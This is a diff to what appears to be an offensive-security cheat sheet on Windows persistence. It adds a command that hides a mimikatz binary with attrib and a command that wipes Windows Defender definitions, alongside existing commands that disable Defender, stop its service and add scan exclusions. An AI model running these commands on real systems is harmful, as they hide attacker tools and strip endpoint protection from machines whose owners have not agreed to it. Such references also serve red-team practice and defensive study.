@@ -3,6 +3,7 @@
 ## Summary
 
 * [Tools](#tools)
+* [Hide Your Binary](#hide-your-binary)
 * [Disable Windows Defender](#disable-windows-defender)
 * [Disable Windows Firewall](#disable-windows-firewall)
 * [Simple User](#simple-user)
@@ -34,6 +35,14 @@
 
 - [SharPersist - Windows persistence toolkit written in C#. - @h4wkst3r](https://github.com/fireeye/SharPersist)
 
+## Hide Your Binary
+
+> Sets (+) or clears (-) the Hidden file attribute. If a file uses this attribute set, you must clear the attribute before you can change any other attributes for the file.
+
+```ps1
+PS> attrib +h mimikatz.exe
+```
+
 ## Disable Windows Defender
 
 ```powershell
@@ -41,6 +50,10 @@
 sc config WinDefend start= disabled
 sc stop WinDefend
 Set-MpPreference -DisableRealtimeMonitoring $true
+
+# Wipe currently stored definitions
+# Location of MpCmdRun.exe: C:\ProgramData\Microsoft\Windows Defender\Platform\<antimalware platform version>
+MpCmdRun.exe -RemoveDefinitions -All
 
 ## Exclude a process / location
 Set-MpPreference -ExclusionProcess "word.exe", "vmwp.exe"
